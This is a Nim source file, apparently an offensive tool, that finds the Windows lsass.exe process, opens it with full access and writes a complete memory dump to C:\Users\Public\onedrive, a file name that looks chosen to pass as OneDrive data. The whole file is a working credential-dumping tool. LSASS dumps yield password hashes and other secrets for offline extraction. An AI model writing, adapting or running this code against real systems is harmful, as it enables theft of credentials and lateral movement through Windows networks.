import winim

type
    MINIDUMP_TYPE = enum
        MiniDumpWithFullMemory = 0x00000002

proc MiniDumpWriteDump(
    hProcess: HANDLE,
    ProcessId: DWORD, 
    hFile: HANDLE, 
    DumpType: MINIDUMP_TYPE, 
    ExceptionParam: INT, 
    UserStreamParam: INT,
    CallbackParam: INT
): BOOL {.importc: "MiniDumpWriteDump", dynlib: "dbghelp", stdcall.}



#proc GetLastError(): DWORD {.stdcall, dynlib: "kernel32", importc: "GetLastError".}

#proc moveFile(lpExistingFileName: LPCWSTR, lpNewFileName: LPCWSTR): BOOL {.importc: "MoveFileW", dynlib: "kernel32", stdcall.}


proc toString(chars: openArray[WCHAR]): string =
    result = ""
    for c in chars:
        if cast[char](c) == '\0':
            break
        result.add(cast[char](c))

proc GetLsassPid(): int =
    var 
        entry: PROCESSENTRY32
        hSnapshot: HANDLE

    entry.dwSize = cast[DWORD](sizeof(PROCESSENTRY32))
    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
    defer: CloseHandle(hSnapshot)

    if Process32First(hSnapshot, addr entry):
        while Process32Next(hSnapshot, addr entry):
            if entry.szExeFile.toString == "lsass.exe":
                return int(entry.th32ProcessID)

    return 0




let processId: int = GetLsassPid()
if not bool(processId):
    echo "[X] Unable to find lsass process"
    quit(1)

echo "[*] lsass PID: ", processId

var hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, cast[DWORD](processId))
if not bool(hProcess):
    echo "[X] Unable to open handle to process"
    quit(1)

try:
    var fs = open(r"C:\Users\Public\onedrive", fmWrite)
    echo "[*] Creating memory dump, please wait..."
    echo fs.getOsFileHandle()
    echo cast[DWORD](processId)
    let success: bool = MiniDumpWriteDump(
        hProcess,
        cast[DWORD](processId),
        fs.getOsFileHandle(),
        MiniDumpWithFullMemory,
        0,
        0,
        0
        )
    if not success:
        let errorCode = GetLastError()
        echo "MiniDUmpWriteDump failed with error code: ", errorCode
    echo "[*] Dump successful: ", bool(success)
    fs.close()
finally:
    CloseHandle(hProcess)